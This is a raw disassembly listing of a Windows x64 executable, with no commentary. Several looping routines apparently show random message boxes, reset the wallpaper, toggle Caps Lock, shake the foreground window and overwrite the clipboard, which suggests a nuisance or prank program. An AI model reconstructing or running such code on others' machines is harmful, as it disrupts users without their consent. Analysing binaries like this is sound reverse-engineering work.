   1400016c0:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400016c5:	48 3b c7             	cmp    %rdi,%rax
   1400016c8:	7d 0d                	jge    0x1400016d7
   1400016ca:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   1400016d0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400016d5:	eb 05                	jmp    0x1400016dc
   1400016d7:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400016dc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400016e1:	e8 ba 48 00 00       	call   0x140005fa0
   1400016e6:	80 3d c7 c9 00 00 00 	cmpb   $0x0,0xc9c7(%rip)        # 0x14000e0b4
   1400016ed:	75 c7                	jne    0x1400016b6
   1400016ef:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400016f4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400016f9:	33 c9                	xor    %ecx,%ecx
   1400016fb:	48 83 c4 28          	add    $0x28,%rsp
   1400016ff:	48 ff 25 fa 7b 00 00 	rex.W jmp *0x7bfa(%rip)        # 0x140009300
   140001706:	cc                   	int3
   140001707:	cc                   	int3
   140001708:	cc                   	int3
   140001709:	cc                   	int3
   14000170a:	cc                   	int3
   14000170b:	cc                   	int3
   14000170c:	cc                   	int3
   14000170d:	cc                   	int3
   14000170e:	cc                   	int3
   14000170f:	cc                   	int3
   140001710:	4c 8b dc             	mov    %rsp,%r11
   140001713:	48 83 ec 68          	sub    $0x68,%rsp
   140001717:	80 3d 96 c9 00 00 00 	cmpb   $0x0,0xc996(%rip)        # 0x14000e0b4
   14000171e:	48 8d 05 d3 80 00 00 	lea    0x80d3(%rip),%rax        # 0x1400097f8
   140001725:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140001729:	48 8d 05 e0 80 00 00 	lea    0x80e0(%rip),%rax        # 0x140009810
   140001730:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140001734:	48 8d 05 ed 80 00 00 	lea    0x80ed(%rip),%rax        # 0x140009828
   14000173b:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   14000173f:	0f 84 be 00 00 00    	je     0x140001803
   140001745:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140001749:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001750:	ff ff 7f 
   140001753:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   140001757:	48 bd ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rbp
   14000175e:	ff ff 7f 
   140001761:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140001765:	33 f6                	xor    %esi,%esi
   140001767:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   14000176b:	bf 00 5e d0 b2       	mov    $0xb2d05e00,%edi
   140001770:	ff 15 82 7e 00 00    	call   *0x7e82(%rip)        # 0x1400095f8
   140001776:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000177d:	00 
   14000177e:	45 33 c9             	xor    %r9d,%r9d
   140001781:	44 8b c0             	mov    %eax,%r8d
   140001784:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001789:	b8 56 55 55 55       	mov    $0x55555556,%eax
   14000178e:	41 f7 e8             	imul   %r8d
   140001791:	8b ca                	mov    %edx,%ecx
   140001793:	c1 e9 1f             	shr    $0x1f,%ecx
   140001796:	03 d1                	add    %ecx,%edx
   140001798:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   14000179b:	44 2b c1             	sub    %ecx,%r8d
   14000179e:	48 8d 15 9b 80 00 00 	lea    0x809b(%rip),%rdx        # 0x140009840
   1400017a5:	4d 63 c0             	movslq %r8d,%r8
   1400017a8:	33 c9                	xor    %ecx,%ecx
   1400017aa:	4e 8b 44 c4 30       	mov    0x30(%rsp,%r8,8),%r8
   1400017af:	ff 15 13 7b 00 00    	call   *0x7b13(%rip)        # 0x1400092c8
   1400017b5:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400017ba:	e8 61 f8 ff ff       	call   0x140001020
   1400017bf:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400017c4:	48 3b c5             	cmp    %rbp,%rax
   1400017c7:	7d 0b                	jge    0x1400017d4
   1400017c9:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   1400017cd:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   1400017d2:	eb 05                	jmp    0x1400017d9
   1400017d4:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   1400017d9:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400017de:	e8 bd 47 00 00       	call   0x140005fa0
   1400017e3:	40 38 35 ca c8 00 00 	cmp    %sil,0xc8ca(%rip)        # 0x14000e0b4
   1400017ea:	75 84                	jne    0x140001770
   1400017ec:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400017f1:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400017f6:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1400017fb:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140001802:	00 
   140001803:	48 83 c4 68          	add    $0x68,%rsp
   140001807:	c3                   	ret
   140001808:	cc                   	int3
   140001809:	cc                   	int3
   14000180a:	cc                   	int3
   14000180b:	cc                   	int3
   14000180c:	cc                   	int3
   14000180d:	cc                   	int3
   14000180e:	cc                   	int3
   14000180f:	cc                   	int3
   140001810:	48 83 ec 38          	sub    $0x38,%rsp
   140001814:	45 33 c9             	xor    %r9d,%r9d
   140001817:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000181e:	00 00 
   140001820:	4c 8d 05 21 81 00 00 	lea    0x8121(%rip),%r8        # 0x140009948
   140001827:	33 c9                	xor    %ecx,%ecx
   140001829:	48 8d 15 20 80 00 00 	lea    0x8020(%rip),%rdx        # 0x140009850
   140001830:	ff 15 fa 7d 00 00    	call   *0x7dfa(%rip)        # 0x140009630
   140001836:	80 3d 77 c8 00 00 00 	cmpb   $0x0,0xc877(%rip)        # 0x14000e0b4
   14000183d:	0f 84 8d 00 00 00    	je     0x1400018d0
   140001843:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001848:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000184f:	ff ff 7f 
   140001852:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001857:	48 be ff 1b f4 ab fd 	movabs $0x7ffffffdabf41bff,%rsi
   14000185e:	ff ff 7f 
   140001861:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001866:	48 bf 00 e4 0b 54 02 	movabs $0x2540be400,%rdi
   14000186d:	00 00 00 
   140001870:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140001876:	4c 8d 05 cb 80 00 00 	lea    0x80cb(%rip),%r8        # 0x140009948
   14000187d:	33 d2                	xor    %edx,%edx
   14000187f:	b9 14 00 00 00       	mov    $0x14,%ecx
   140001884:	ff 15 7e 7a 00 00    	call   *0x7a7e(%rip)        # 0x140009308
   14000188a:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000188f:	e8 8c f7 ff ff       	call   0x140001020
   140001894:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001899:	48 3b c6             	cmp    %rsi,%rax
   14000189c:	7d 0b                	jge    0x1400018a9
   14000189e:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   1400018a2:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400018a7:	eb 05                	jmp    0x1400018ae
   1400018a9:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400018ae:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400018b3:	e8 e8 46 00 00       	call   0x140005fa0
   1400018b8:	80 3d f5 c7 00 00 00 	cmpb   $0x0,0xc7f5(%rip)        # 0x14000e0b4
   1400018bf:	75 af                	jne    0x140001870
   1400018c1:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400018c6:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400018cb:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400018d0:	48 83 c4 38          	add    $0x38,%rsp
   1400018d4:	c3                   	ret
   1400018d5:	cc                   	int3
   1400018d6:	cc                   	int3
   1400018d7:	cc                   	int3
   1400018d8:	cc                   	int3
   1400018d9:	cc                   	int3
   1400018da:	cc                   	int3
   1400018db:	cc                   	int3
   1400018dc:	cc                   	int3
   1400018dd:	cc                   	int3
   1400018de:	cc                   	int3
   1400018df:	cc                   	int3
   1400018e0:	48 83 ec 68          	sub    $0x68,%rsp
   1400018e4:	48 8b 05 55 c7 00 00 	mov    0xc755(%rip),%rax        # 0x14000e040
   1400018eb:	48 33 c4             	xor    %rsp,%rax
   1400018ee:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400018f3:	33 d2                	xor    %edx,%edx
   1400018f5:	48 8d 0d 64 80 00 00 	lea    0x8064(%rip),%rcx        # 0x140009960
   1400018fc:	ff 15 9e 7a 00 00    	call   *0x7a9e(%rip)        # 0x1400093a0
   140001902:	80 3d ab c7 00 00 00 	cmpb   $0x0,0xc7ab(%rip)        # 0x14000e0b4
   140001909:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000190e:	c7 44 24 30 20 00 00 	movl   $0x20,0x30(%rsp)
   140001915:	00 
   140001916:	c7 44 24 40 0f 00 00 	movl   $0xf,0x40(%rsp)
   14000191d:	00 
   14000191e:	c7 44 24 44 ff ff ff 	movl   $0xffffffff,0x44(%rsp)
   140001925:	ff 
   140001926:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   14000192d:	00 
   14000192e:	74 6e                	je     0x14000199e
   140001930:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140001935:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000193c:	ff ff 7f 
   14000193f:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140001944:	48 bf ff 6b ca 88 ff 	movabs $0x7fffffff88ca6bff,%rdi
   14000194b:	ff ff 7f 
   14000194e:	66 90                	xchg   %ax,%ax
   140001950:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001955:	ff 15 35 7a 00 00    	call   *0x7a35(%rip)        # 0x140009390
   14000195b:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140001960:	e8 bb f6 ff ff       	call   0x140001020
   140001965:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000196a:	48 3b c7             	cmp    %rdi,%rax
   14000196d:	7d 0d                	jge    0x14000197c
   14000196f:	48 05 00 94 35 77    	add    $0x77359400,%rax
   140001975:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000197a:	eb 05                	jmp    0x140001981
   14000197c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001981:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001986:	e8 15 46 00 00       	call   0x140005fa0
   14000198b:	80 3d 22 c7 00 00 00 	cmpb   $0x0,0xc722(%rip)        # 0x14000e0b4
   140001992:	75 bc                	jne    0x140001950
   140001994:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140001999:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000199e:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400019a3:	48 33 cc             	xor    %rsp,%rcx
   1400019a6:	e8 55 53 00 00       	call   0x140006d00
   1400019ab:	48 83 c4 68          	add    $0x68,%rsp
   1400019af:	c3                   	ret
   1400019b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400019b4:	80 3d f9 c6 00 00 00 	cmpb   $0x0,0xc6f9(%rip)        # 0x14000e0b4
   1400019bb:	0f 84 88 00 00 00    	je     0x140001a49
   1400019c1:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400019c6:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400019cd:	ff ff 7f 
   1400019d0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400019d5:	48 bf ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rdi
   1400019dc:	ff ff 7f 
   1400019df:	90                   	nop
   1400019e0:	45 33 c9             	xor    %r9d,%r9d
   1400019e3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400019e9:	b2 3a                	mov    $0x3a,%dl
   1400019eb:	b1 14                	mov    $0x14,%cl
   1400019ed:	ff 15 5d 79 00 00    	call   *0x795d(%rip)        # 0x140009350
   1400019f3:	45 33 c9             	xor    %r9d,%r9d
   1400019f6:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400019fc:	b2 3a                	mov    $0x3a,%dl
   1400019fe:	b1 14                	mov    $0x14,%cl
   140001a00:	ff 15 4a 79 00 00    	call   *0x794a(%rip)        # 0x140009350
   140001a06:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001a0b:	e8 10 f6 ff ff       	call   0x140001020
   140001a10:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001a15:	48 3b c7             	cmp    %rdi,%rax
   140001a18:	7d 0d                	jge    0x140001a27
   140001a1a:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   140001a20:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001a25:	eb 05                	jmp    0x140001a2c
   140001a27:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001a2c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001a31:	e8 6a 45 00 00       	call   0x140005fa0
   140001a36:	80 3d 77 c6 00 00 00 	cmpb   $0x0,0xc677(%rip)        # 0x14000e0b4
   140001a3d:	75 a1                	jne    0x1400019e0
   140001a3f:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001a44:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001a49:	48 83 c4 28          	add    $0x28,%rsp
   140001a4d:	c3                   	ret
   140001a4e:	cc                   	int3
   140001a4f:	cc                   	int3
   140001a50:	4c 8b dc             	mov    %rsp,%r11
   140001a53:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140001a5a:	48 8b 05 df c5 00 00 	mov    0xc5df(%rip),%rax        # 0x14000e040
   140001a61:	48 33 c4             	xor    %rsp,%rax
   140001a64:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140001a69:	80 3d 44 c6 00 00 00 	cmpb   $0x0,0xc644(%rip)        # 0x14000e0b4
   140001a70:	0f 84 b7 01 00 00    	je     0x140001c2d
   140001a76:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   140001a7a:	49 89 6b 10          	mov    %rbp,0x10(%r11)
   140001a7e:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140001a85:	ff ff 7f 
   140001a88:	49 89 73 18          	mov    %rsi,0x18(%r11)
   140001a8c:	49 89 7b 20          	mov    %rdi,0x20(%r11)
   140001a90:	4d 89 63 f8          	mov    %r12,-0x8(%r11)
   140001a94:	49 bc 7f 3c 36 fe ff 	movabs $0x7ffffffffe363c7f,%r12
   140001a9b:	ff ff 7f 
   140001a9e:	4d 89 73 f0          	mov    %r14,-0x10(%r11)
   140001aa2:	45 33 f6             	xor    %r14d,%r14d
   140001aa5:	4d 89 7b e8          	mov    %r15,-0x18(%r11)
   140001aa9:	49 bf ff d2 ce fe ff 	movabs $0x7ffffffffeced2ff,%r15
   140001ab0:	ff ff 7f 
   140001ab3:	ff 15 f7 78 00 00    	call   *0x78f7(%rip)        # 0x1400093b0
   140001ab9:	48 8b f0             	mov    %rax,%rsi
   140001abc:	48 85 c0             	test   %rax,%rax
   140001abf:	0f 84 f9 00 00 00    	je     0x140001bbe
   140001ac5:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140001aca:	48 8b c8             	mov    %rax,%rcx
   140001acd:	ff 15 4d 78 00 00    	call   *0x784d(%rip)        # 0x140009320
   140001ad3:	85 c0                	test   %eax,%eax
   140001ad5:	0f 84 e3 00 00 00    	je     0x140001bbe
   140001adb:	bb 0a 00 00 00       	mov    $0xa,%ebx
   140001ae0:	ff 15 12 7b 00 00    	call   *0x7b12(%rip)        # 0x1400095f8
   140001ae6:	44 8b c0             	mov    %eax,%r8d
   140001ae9:	b8 67 66 66 66       	mov    $0x66666667,%eax
   140001aee:	41 f7 e8             	imul   %r8d
   140001af1:	c1 fa 03             	sar    $0x3,%edx
   140001af4:	8b ca                	mov    %edx,%ecx
   140001af6:	c1 e9 1f             	shr    $0x1f,%ecx
   140001af9:	03 d1                	add    %ecx,%edx
   140001afb:	8d 0c 92             	lea    (%rdx,%rdx,4),%ecx
   140001afe:	c1 e1 02             	shl    $0x2,%ecx
   140001b01:	44 2b c1             	sub    %ecx,%r8d
   140001b04:	41 8d 78 f6          	lea    -0xa(%r8),%edi
   140001b08:	ff 15 ea 7a 00 00    	call   *0x7aea(%rip)        # 0x1400095f8
   140001b0e:	44 8b 4c 24 5c       	mov    0x5c(%rsp),%r9d
   140001b13:	44 8b c0             	mov    %eax,%r8d
   140001b16:	b8 67 66 66 66       	mov    $0x66666667,%eax
   140001b1b:	c7 44 24 30 15 00 00 	movl   $0x15,0x30(%rsp)
   140001b22:	00 
   140001b23:	41 f7 e8             	imul   %r8d
   140001b26:	41 83 c1 f6          	add    $0xfffffff6,%r9d
   140001b2a:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140001b2f:	c1 fa 03             	sar    $0x3,%edx
   140001b32:	8b ca                	mov    %edx,%ecx
   140001b34:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   140001b39:	c1 e9 1f             	shr    $0x1f,%ecx
   140001b3c:	03 d1                	add    %ecx,%edx
   140001b3e:	8d 0c 92             	lea    (%rdx,%rdx,4),%ecx
   140001b41:	33 d2                	xor    %edx,%edx
   140001b43:	c1 e1 02             	shl    $0x2,%ecx
   140001b46:	44 2b c1             	sub    %ecx,%r8d
   140001b49:	48 8b ce             	mov    %rsi,%rcx
   140001b4c:	45 03 c8             	add    %r8d,%r9d
   140001b4f:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   140001b54:	44 03 c7             	add    %edi,%r8d
   140001b57:	ff 15 eb 77 00 00    	call   *0x77eb(%rip)        # 0x140009348
   140001b5d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001b62:	e8 b9 f4 ff ff       	call   0x140001020
   140001b67:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001b6c:	49 3b c4             	cmp    %r12,%rax
   140001b6f:	7d 0d                	jge    0x140001b7e
   140001b71:	48 05 80 c3 c9 01    	add    $0x1c9c380,%rax
   140001b77:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001b7c:	eb 05                	jmp    0x140001b83
   140001b7e:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140001b83:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001b88:	e8 13 44 00 00       	call   0x140005fa0
   140001b8d:	48 83 eb 01          	sub    $0x1,%rbx
   140001b91:	0f 85 49 ff ff ff    	jne    0x140001ae0
   140001b97:	44 8b 4c 24 5c       	mov    0x5c(%rsp),%r9d
   140001b9c:	33 d2                	xor    %edx,%edx
   140001b9e:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   140001ba3:	48 8b ce             	mov    %rsi,%rcx
   140001ba6:	c7 44 24 30 15 00 00 	movl   $0x15,0x30(%rsp)
   140001bad:	00 
   140001bae:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140001bb3:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   140001bb8:	ff 15 8a 77 00 00    	call   *0x778a(%rip)        # 0x140009348
   140001bbe:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001bc3:	e8 58 f4 ff ff       	call   0x140001020
   140001bc8:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001bcd:	49 3b c7             	cmp    %r15,%rax
   140001bd0:	7d 0d                	jge    0x140001bdf
   140001bd2:	48 05 00 2d 31 01    	add    $0x1312d00,%rax
   140001bd8:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001bdd:	eb 05                	jmp    0x140001be4
   140001bdf:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140001be4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001be9:	e8 b2 43 00 00       	call   0x140005fa0
   140001bee:	44 38 35 bf c4 00 00 	cmp    %r14b,0xc4bf(%rip)        # 0x14000e0b4
   140001bf5:	0f 85 b8 fe ff ff    	jne    0x140001ab3
   140001bfb:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   140001c00:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   140001c05:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   140001c0c:	00 
   140001c0d:	48 8b bc 24 a8 00 00 	mov    0xa8(%rsp),%rdi
   140001c14:	00 
   140001c15:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140001c1c:	00 
   140001c1d:	48 8b ac 24 98 00 00 	mov    0x98(%rsp),%rbp
   140001c24:	00 
   140001c25:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140001c2c:	00 
   140001c2d:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140001c32:	48 33 cc             	xor    %rsp,%rcx
   140001c35:	e8 c6 50 00 00       	call   0x140006d00
   140001c3a:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140001c41:	c3                   	ret
   140001c42:	cc                   	int3
   140001c43:	cc                   	int3
   140001c44:	cc                   	int3
   140001c45:	cc                   	int3
   140001c46:	cc                   	int3
   140001c47:	cc                   	int3
   140001c48:	cc                   	int3
   140001c49:	cc                   	int3
   140001c4a:	cc                   	int3
   140001c4b:	cc                   	int3
   140001c4c:	cc                   	int3
   140001c4d:	cc                   	int3
   140001c4e:	cc                   	int3
   140001c4f:	cc                   	int3
   140001c50:	4c 8b dc             	mov    %rsp,%r11
   140001c53:	48 83 ec 68          	sub    $0x68,%rsp
   140001c57:	80 3d 56 c4 00 00 00 	cmpb   $0x0,0xc456(%rip)        # 0x14000e0b4
   140001c5e:	48 8d 05 1b 7d 00 00 	lea    0x7d1b(%rip),%rax        # 0x140009980
   140001c65:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140001c69:	48 8d 05 40 7d 00 00 	lea    0x7d40(%rip),%rax        # 0x1400099b0
   140001c70:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140001c74:	48 8d 05 65 7d 00 00 	lea    0x7d65(%rip),%rax        # 0x1400099e0
   140001c7b:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   140001c7f:	48 8d 05 aa 7d 00 00 	lea    0x7daa(%rip),%rax        # 0x140009a30
   140001c86:	49 89 43 e0          	mov    %rax,-0x20(%r11)
   140001c8a:	0f 84 b9 00 00 00    	je     0x140001d49
   140001c90:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140001c94:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001c9b:	ff ff 7f 
   140001c9e:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   140001ca2:	48 bd ff 0d fa d5 fe 	movabs $0x7ffffffed5fa0dff,%rbp
   140001ca9:	ff ff 7f 
   140001cac:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140001cb0:	33 f6                	xor    %esi,%esi
   140001cb2:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   140001cb6:	48 bf 00 f2 05 2a 01 	movabs $0x12a05f200,%rdi
   140001cbd:	00 00 00 
   140001cc0:	ff 15 32 79 00 00    	call   *0x7932(%rip)        # 0x1400095f8
   140001cc6:	25 03 00 00 80       	and    $0x80000003,%eax
   140001ccb:	7d 07                	jge    0x140001cd4
   140001ccd:	ff c8                	dec    %eax
   140001ccf:	83 c8 fc             	or     $0xfffffffc,%eax
   140001cd2:	ff c0                	inc    %eax
   140001cd4:	4c 63 c0             	movslq %eax,%r8
   140001cd7:	48 8d 15 62 7b 00 00 	lea    0x7b62(%rip),%rdx        # 0x140009840
   140001cde:	c7 44 24 28 0a 00 00 	movl   $0xa,0x28(%rsp)
   140001ce5:	00 
   140001ce6:	45 33 c9             	xor    %r9d,%r9d
   140001ce9:	33 c9                	xor    %ecx,%ecx
   140001ceb:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001cf0:	4e 8b 44 c4 30       	mov    0x30(%rsp,%r8,8),%r8
   140001cf5:	ff 15 cd 75 00 00    	call   *0x75cd(%rip)        # 0x1400092c8
   140001cfb:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140001d00:	e8 1b f3 ff ff       	call   0x140001020
   140001d05:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140001d0a:	48 3b c5             	cmp    %rbp,%rax
   140001d0d:	7d 0b                	jge    0x140001d1a
   140001d0f:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001d13:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140001d18:	eb 05                	jmp    0x140001d1f
   140001d1a:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140001d1f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001d24:	e8 77 42 00 00       	call   0x140005fa0
   140001d29:	40 38 35 84 c3 00 00 	cmp    %sil,0xc384(%rip)        # 0x14000e0b4
   140001d30:	75 8e                	jne    0x140001cc0
   140001d32:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140001d37:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140001d3c:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140001d41:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140001d48:	00 
   140001d49:	48 83 c4 68          	add    $0x68,%rsp
   140001d4d:	c3                   	ret
   140001d4e:	cc                   	int3
   140001d4f:	cc                   	int3
   140001d50:	48 83 ec 28          	sub    $0x28,%rsp
   140001d54:	80 3d 59 c3 00 00 00 	cmpb   $0x0,0xc359(%rip)        # 0x14000e0b4
   140001d5b:	0f 84 d4 00 00 00    	je     0x140001e35
   140001d61:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140001d66:	48 be ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rsi
   140001d6d:	ff ff 7f 
   140001d70:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001d75:	48 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdi
   140001d7c:	ff ff 7f 
   140001d7f:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001d84:	33 c9                	xor    %ecx,%ecx
   140001d86:	ff 15 e4 75 00 00    	call   *0x75e4(%rip)        # 0x140009370
   140001d8c:	85 c0                	test   %eax,%eax
   140001d8e:	74 59                	je     0x140001de9
   140001d90:	ff 15 32 76 00 00    	call   *0x7632(%rip)        # 0x1400093c8
   140001d96:	ba 12 00 00 00       	mov    $0x12,%edx
   140001d9b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001da0:	ff 15 52 73 00 00    	call   *0x7352(%rip)        # 0x1400090f8
   140001da6:	48 8b d8             	mov    %rax,%rbx
   140001da9:	48 85 c0             	test   %rax,%rax
   140001dac:	74 35                	je     0x140001de3
   140001dae:	48 8b c8             	mov    %rax,%rcx
   140001db1:	ff 15 f1 72 00 00    	call   *0x72f1(%rip)        # 0x1400090a8
   140001db7:	0f 10 05 ca 7c 00 00 	movups 0x7cca(%rip),%xmm0        # 0x140009a88
   140001dbe:	0f 11 00             	movups %xmm0,(%rax)
   140001dc1:	0f b7 0d d0 7c 00 00 	movzwl 0x7cd0(%rip),%ecx        # 0x140009a98
   140001dc8:	66 89 48 10          	mov    %cx,0x10(%rax)
   140001dcc:	48 8b cb             	mov    %rbx,%rcx
   140001dcf:	ff 15 7b 72 00 00    	call   *0x727b(%rip)        # 0x140009050
   140001dd5:	48 8b d3             	mov    %rbx,%rdx
   140001dd8:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140001ddd:	ff 15 b5 75 00 00    	call   *0x75b5(%rip)        # 0x140009398
   140001de3:	ff 15 97 75 00 00    	call   *0x7597(%rip)        # 0x140009380
   140001de9:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001dee:	e8 2d f2 ff ff       	call   0x140001020
   140001df3:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001df8:	48 3b c6             	cmp    %rsi,%rax
   140001dfb:	7d 0d                	jge    0x140001e0a
   140001dfd:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   140001e03:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001e08:	eb 05                	jmp    0x140001e0f
   140001e0a:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001e0f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001e14:	e8 87 41 00 00       	call   0x140005fa0
   140001e19:	80 3d 94 c2 00 00 00 	cmpb   $0x0,0xc294(%rip)        # 0x14000e0b4
   140001e20:	0f 85 5e ff ff ff    	jne    0x140001d84
   140001e26:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001e2b:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140001e30:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001e35:	48 83 c4 28          	add    $0x28,%rsp
   140001e39:	c3                   	ret
   140001e3a:	cc                   	int3
   140001e3b:	cc                   	int3
   140001e3c:	cc                   	int3
   140001e3d:	cc                   	int3
   140001e3e:	cc                   	int3
